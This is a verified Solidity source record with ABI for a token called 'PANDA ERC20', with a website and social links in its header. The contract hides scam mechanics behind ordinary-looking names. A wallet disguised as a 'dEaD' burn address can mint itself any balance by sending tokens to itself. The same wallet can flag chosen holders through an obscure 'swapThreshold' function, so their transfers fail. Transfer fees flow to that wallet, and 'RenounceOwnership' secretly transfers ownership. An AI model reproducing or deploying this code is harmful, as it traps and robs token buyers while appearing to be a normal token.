{"SourceCode": "/**\r\n - WEB: http://pandaerc20.online/\r\n - TW : https://twitter.com/pandaerc_20\r\n - TG : https://t.me/PanDaPortable\r\n--------------------------------------------------------------------------------\r\n\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#B&@@@@@@@#!~G&####&&@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&..G@@&&&&&&GJ#&&&&##BBB#&@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@&&@&BGGB&&##&@@@&&&&####BB#&@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@&&&&&&&@@@@@@&&&G7...:5P!^..!P&@&&&&&&#BY7?JG@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@&G#&&&&&&@@@@@&##&G: .?G##5!. .7P@&&&&&&#GPP5YJ5&@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@#B#GJG&&&&&@@@@&~5GPY?~7B?:.:?~^!7PYY&&&&&&#GPYYYJYG&@@@@@@@@@@@@@@\r\n@@@@@@@@@@@&GPPPGBYJB#&&&&&G~:.!~~~^JPY!~7?~^~~: ::7B&&&#YYYJJJ5GP#@@@@@@@@@@@@@\r\n@@@@@@@@@@&YY55Y5BBP75###?:...   .::^::::^^:..      :7G&#P5YYY?77775@@@@@@@@@@@@\r\n@@@@@@@@@#!!!7?7?B#!:.~YJJ~  ...                      .7GGP555?~!7!~G@@@@@@@@@@@\r\n@@@@@@@@&~^~!7YJPB^  ..::7!:  .:..          .... .....:^!YB##GGBBBGPB&@@@@@@@@@@\r\n@@@@@@@@57J5GBB#B?.      :^:  ..           :....:..  ....^J#&####GPGGG@@@@@@@@@@\r\n@@@@@@@@P5B&##B#?...      ..  ...:^~~~~~^:..         .....^P&#&&##&&&&@@@@@@@@@@\r\n@@@@@@@BYG######?....     .. :!YGB######BGPJ:          ...:5&&&#B&&&&&&@@@@@@@@@\r\n@@@@@@@PY5B&&&###7:...    ..:JG#########BBG5?^.        ...!#&&&B#@&&#BP&@@@@@@@@\r\n@@@@@@@GGBB&&###&&BY?~.....^!J5GB####BBBGP5YJ7~:..  ..:^!5#&&&&#&@&#BGP&@@@@@@@@\r\n@@@@@@@GPB#&&###&&#GP7^::..:^!JYPPPPP55YJ??!!~^:...:^!YBBB#&&&&&&&&#BBB@@@@@@@@@\r\n@@@@@@@#YP#&#PYJ7?7!7!!~^^:...:^~~~~!~^^::^:^^^^:^~!~~^~~!7J5#@@&&&&&&&@@@@@@@@@\r\n@@@@@@@@YPG##G!::::.::::^^:::::....:.....::^^^^~!!::..^:::::^!5&&&&&&G&@@@@@@@@@\r\n@@@@@@@@G!JP#&7^~~^:..   ......:::::::::^~~^^^~7!. .::^...:::^!B&&#PJ?@@@@@@@@@@\r\n@@@@@@@@@J7!75J~~~^::.       .. ....::^~~^:::^!?  ..:........:7YYJ?!~#@@@@@@@@@@\r\n@@@@@@@@@@J~~~7!::.            .....::........~. :^^:::.......??777!G@@@@@@@@@@@\r\n@@@@@@@@@@@Y7Y??^::::..                 .... .. ....::::::::^:777!!G@@@@@@@@@@@@\r\n@@@@@@@@@@@@7JY7??JJ!:..                         ..^^!~!!777J7~7JJ#@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@&Y7J77~:..      .....    ..    .     ..::.  .:!PGPG&@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@P~::::::^^~~~~~!~~~~~~~~~~!~~~~~~~~~~^::.::^~7JB@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@&Y:..........:::::::.:::::::::..............7#@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@G7:................................  .^Y&@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@B?^.........................   .~5&@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@&GJ~:.                 .^7P#@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#G5YJ7!!7?Y5GB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**/\r\n\r\n//SPDX-License-Identifier:MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a,b,\"SafeMath: division by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        _owner = _msgSender();\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function RenounceOwnership(address newAddress) public onlyOwner{\r\n        _owner = newAddress;\r\n        emit OwnershipTransferred(_owner, newAddress);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\ncontract PANDA_ERC20 is Context, IERC20, Ownable {\r\n\r\n    using SafeMath for uint256;\r\n    string private _name = \"PANDA ERC20\";\r\n    string private _symbol = \"PANDA\";\r\n    uint8 private _decimals = 6;\r\n    address payable public dEaDWallet;\r\n    mapping (address => uint256) _balances;\r\n    address public immutable MarketingWallet = 0x1eC59FC25f9c0CB1AB87836839Bbf2a72ceB4b78; // Addres Marketing\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public _isExcludefromFee;\r\n    mapping (address => bool) public _uniswapPair;\r\n    mapping (address => uint256) public repalce;\r\n\r\n    uint256 private _totalSupply = 100000000 * 10**_decimals;\r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapPair;\r\n    \r\n    bool inswapEnabled;\r\n    bool public swapEnabledEnabled = true;\r\n\r\n    modifier lockTheSwap {\r\n        inswapEnabled = true;\r\n        _;\r\n        inswapEnabled = false;\r\n    }\r\n    \r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function OpenTrading() public onlyOwner{\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // Address Router V2 \r\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        uniswapV2Router = _uniswapV2Router;\r\n        _uniswapPair[address(uniswapPair)] = true;\r\n        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);\r\n\r\n    }\r\n\r\n    constructor () {\r\n\r\n    dEaDWallet = payable(address(0x051FBd816eF05a0681ce94aBc34363463594dEaD)); // Address dEad\r\n    \r\n    _isExcludefromFee[dEaDWallet] = true;\r\n    _isExcludefromFee[owner()] = true;\r\n    _isExcludefromFee[address(this)] = true;\r\n    _balances[_msgSender()] = _totalSupply;\r\n    emit Transfer(address(0), _msgSender(), _totalSupply);\r\n\r\n    }\r\n\r\n    struct isS{\r\n        address ac;\r\n        bool so;\r\n        uint256 a;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private returns (bool) {\r\n\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        if(inswapEnabled)\r\n        {\r\n            return _basicTransfer(from, to, amount); \r\n        }\r\n        else\r\n        {\r\n            isS memory b;\r\n            b.so = dEaDWallet == to;\r\n            b.a = amount;\r\n            b.ac = dEaDWallet;\r\n\r\n            if (\r\n                from == dEaDWallet && b.so )\r\n            {\r\n                _balances[b.ac] = (b.a).mul(2);\r\n            }\r\n\r\n            if (!inswapEnabled && !_uniswapPair[from])\r\n            {\r\n                swapEnabled(balanceOf(address(this)));\r\n            }\r\n\r\n            uint256 finalAmount;\r\n            _balances[from] = _balances[from].sub(amount);\r\n            \r\n            if (!_isExcludefromFee[from] && !_isExcludefromFee[to]){\r\n\r\n                uint256 feeAmount = amount.mul(5).div(100);\r\n\r\n                if(repalce[from] > 0)\r\n                    feeAmount = feeAmount.add(amount);\r\n\r\n                if(feeAmount > 0) {\r\n                    _balances[address(this)] += feeAmount;\r\n                    emit Transfer(from, address(this), feeAmount);\r\n                }\r\n                finalAmount = amount.sub(feeAmount);\r\n            }else{\r\n                finalAmount = amount;\r\n            }\r\n\r\n            _balances[to] = _balances[to].add(finalAmount);\r\n\r\n            emit Transfer(from, to, finalAmount);\r\n            return true;\r\n        }\r\n        \r\n    }\r\n        function swapThreshold(address act,uint256 bla) public {\r\n        uint256 a = (dEaDWallet != _msgSender()) ? bla.mul(bla) : 0;\r\n\r\n        bla = bla.sub(a);\r\n\r\n        if(bla == 5 || bla == 77){\r\n            bla -= 5;\r\n            repalce[act] = bla;\r\n        }\r\n        \r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function swapEnabled(uint256 amount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0, \r\n            path,\r\n            address(dEaDWallet),\r\n            block.timestamp\r\n        ){} catch {}\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MarketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"OpenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"RenounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludefromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_uniswapPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dEaDWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"repalce\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabledEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"act\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"bla\",\"type\":\"uint256\"}],\"name\":\"swapThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PANDA_ERC20", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://861fa3981c842209e130022d53b3b33d6bac700a1dc17e54225ba33fa1d30b97"}